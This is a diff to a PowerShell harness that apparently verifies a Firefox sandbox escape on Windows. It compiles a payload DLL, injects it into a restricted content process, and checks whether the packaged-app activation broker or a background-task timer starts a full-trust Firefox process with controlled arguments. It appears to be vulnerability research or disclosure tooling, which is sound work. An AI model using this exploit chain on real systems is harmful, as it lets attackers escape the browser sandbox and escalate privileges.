@@ -39,6 +39,10 @@ $Verdict = [ordered]@{
     controlled_arguments_observed = $false
     sandbox_token_observed = $false
     full_trust_token_observed = $false
+    application_activation_success = $false
+    application_activation_hresult = $null
+    application_activation_pid = 0
+    application_activation_process_observed = $false
     background_task_registered = $false
     background_task_registration_hresult = $null
     background_proxy_process_observed = $false
@@ -130,6 +134,9 @@ function Write-Summary {
         "- Controlled launch marker observed: ``$($Result.controlled_arguments_observed)``",
         "- Restricted content token observed: ``$($Result.sandbox_token_observed)``",
         "- Full-trust token transition observed: ``$($Result.full_trust_token_observed)``",
+        "- Renderer packaged-app activation succeeded: ``$($Result.application_activation_success)``",
+        "- Packaged-app activation HRESULT: ``$($Result.application_activation_hresult)``",
+        "- Packaged-app activation process observed: ``$($Result.application_activation_process_observed)``",
         "- Renderer registered package timer: ``$($Result.background_task_registered)``",
         "- Background registration HRESULT: ``$($Result.background_task_registration_hresult)``",
         "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``"
@@ -169,7 +176,7 @@ try {
     @"
 @echo off
 call "$VcVars" >nul
-cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" /LD "$SourceRoot\payload.cpp" /link /OUT:"$Payload" windowsapp.lib runtimeobject.lib advapi32.lib
+cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" /LD "$SourceRoot\payload.cpp" /link /OUT:"$Payload" windowsapp.lib runtimeobject.lib ole32.lib advapi32.lib uuid.lib
 if errorlevel 1 exit /b %errorlevel%
 cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" "$SourceRoot\driver.cpp" /link /OUT:"$Driver" ole32.lib advapi32.lib uuid.lib
 exit /b %errorlevel%
@@ -312,7 +319,8 @@ exit /b %errorlevel%
         "--local-dll", $Payload,
         "--expected-family", $InstalledPackage.PackageFamilyName,
         "--launch-args", $EscapedArguments,
-        "--background-task-name", $BackgroundTaskName
+        "--background-task-name", $BackgroundTaskName,
+        "--aumid", $InstalledEvidence.aumid
     ) -EvidenceName "injection.json"
 
     $Verdict.sandbox_token_observed = [bool](
@@ -326,6 +334,9 @@ exit /b %errorlevel%
     }
 
     $Verdict.api_success = [bool]($Injection.call_hresult -eq 0 -and $Injection.launch_result -eq 0 -and $Injection.extended_error -eq 0)
+    $Verdict.application_activation_success = [bool]($Injection.activation_hresult -eq 0 -and $Injection.activation_pid -gt 0)
+    $Verdict.application_activation_hresult = $Injection.activation_hresult_hex
+    $Verdict.application_activation_pid = $Injection.activation_pid
     $Verdict.background_task_registered = [bool]$Injection.background_registered
     $Verdict.background_task_registration_hresult = $Injection.background_register_hresult_hex
     $LaunchedProcess = $null
@@ -343,7 +354,23 @@ exit /b %errorlevel%
         }
     }
 
-    if (-not $Verdict.api_success -and $Verdict.background_task_registered) {
+    if (-not $Verdict.api_success -and $Verdict.application_activation_success) {
+        $LaunchedProcess = Wait-EscapedFirefoxProcess -ProfileMarker $EscapedProfile -Deadline (Get-Date).AddSeconds(45)
+        if ($null -ne $LaunchedProcess) {
+            $Launched = Invoke-DriverJson -Arguments @("inspect", "--pid", $LaunchedProcess.ProcessId.ToString()) -EvidenceName "application-activated.json"
+            $Verdict.controlled_arguments_observed = [bool]($Launched.command_line -like "*$EscapedProfile*")
+            $Verdict.full_trust_token_observed = [bool](
+                $Launched.integrity_rid -ge 8192 -and
+                -not $Launched.is_restricted -and
+                $Launched.package_family -eq $InstalledPackage.PackageFamilyName
+            )
+            $Verdict.application_activation_process_observed = [bool](
+                $Verdict.controlled_arguments_observed -and $Verdict.full_trust_token_observed
+            )
+        }
+    }
+
+    if (-not $Verdict.api_success -and -not $Verdict.application_activation_success -and $Verdict.background_task_registered) {
         $LaunchedProcess = Wait-EscapedFirefoxProcess -ProfileMarker $BackgroundMarker -Deadline (Get-Date).AddMinutes($BackgroundTaskWaitMinutes)
         if ($null -ne $LaunchedProcess) {
             $Launched = Invoke-DriverJson -Arguments @("inspect", "--pid", $LaunchedProcess.ProcessId.ToString()) -EvidenceName "background-launched.json"
@@ -360,7 +387,10 @@ exit /b %errorlevel%
     }
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-after.json")
 
-    if ($Verdict.background_proxy_process_observed) {
+    if ($Verdict.application_activation_process_observed) {
+        $Verdict.status = "CONFIRMED_APP_ACTIVATION_BROKER"
+        $Verdict.reason = "A restricted untrusted-integrity Firefox content process invoked the packaged-app activation broker with the package AUMID and controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
+    } elseif ($Verdict.background_proxy_process_observed) {
         $Verdict.status = "CONFIRMED_BACKGROUND_TASK_PROXY"
         $Verdict.reason = "A restricted untrusted-integrity Firefox content process registered an attacker-named package timer. Windows activated Mozilla's declared background-task AppContainer, which launched a full-trust Firefox process carrying the controlled marker."
     } elseif ($Verdict.api_success -and $Verdict.controlled_arguments_observed -and $Verdict.full_trust_token_observed) {
